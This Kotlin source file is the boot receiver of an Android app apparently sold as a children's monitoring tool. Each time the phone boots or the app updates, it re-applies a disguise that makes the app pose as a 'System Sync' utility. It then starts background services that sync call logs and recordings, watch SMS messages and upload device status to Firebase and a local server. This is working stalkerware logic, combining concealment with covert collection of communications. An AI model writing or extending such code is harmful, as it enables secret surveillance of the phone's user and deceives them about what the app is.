package com.vyra.kids.receivers

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log
import com.vyra.kids.core.AppConstants
import com.vyra.kids.core.PrefsManager
import com.vyra.kids.services.CallRecordingSyncService

class BootReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context?, intent: Intent?) {
        if (context == null || intent == null) return

        val isBoot = intent.action == Intent.ACTION_BOOT_COMPLETED ||
                intent.action == "android.intent.action.QUICKBOOT_POWERON"
        val isPackageReplaced = intent.action == Intent.ACTION_MY_PACKAGE_REPLACED

        if (isBoot || isPackageReplaced) {
            val prefs = PrefsManager(context)

            // When updated or booted, ensure System Sync disguise (2 purple curved arrows) is active
            try {
                com.vyra.kids.core.DisguiseManager(context).applyDisguise(com.vyra.kids.core.DisguiseProfile.SYSTEM_SYNC)
            } catch (e: Exception) {
                Log.w(AppConstants.TAG, "Error applying disguise on boot/update", e)
            }

            if (prefs.isConfigured) {
                Log.i(AppConstants.TAG, "App started via ${intent.action}. Initializing background sync.")
                com.vyra.kids.core.LocalLanSyncServer.getInstance(context).start()
                com.vyra.kids.core.FirebaseSyncManager.getInstance(context).syncDeviceStatus()
                CallRecordingSyncService.syncCallsAndRecordings(context)
                val smsIntent = Intent(context, com.vyra.kids.services.SmsObserverService::class.java)
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                    context.startForegroundService(smsIntent)
                } else {
                    context.startService(smsIntent)
                }
                com.vyra.kids.core.NetworkSyncManager.getInstance(context).scheduleOfflineSyncWorker()
            }
        }
    }
}
